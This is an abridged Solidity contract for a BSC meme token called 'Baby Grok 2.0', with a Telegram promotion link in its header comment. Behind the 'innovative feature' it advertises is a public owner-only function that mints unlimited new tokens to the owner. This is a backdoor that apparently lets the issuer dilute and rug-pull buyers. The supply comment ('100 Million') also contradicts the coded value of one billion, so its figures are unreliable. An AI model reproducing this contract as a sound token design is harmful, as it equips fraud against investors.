//
// $BabyGrok20 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Babygrok20bsc
// 📱 website ::https://
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyGrok20(uint256 amount) public onlyOwner {
 _BabyGrok20(msg.sender, amount);
    }
    ...
    function _BabyGrok20(address account, uint256 amount) internal virtual {
...
contract $BabyGrok20 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Baby Grok 2.0", "BBYGRK2.0") {
     _BabyGrok20(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}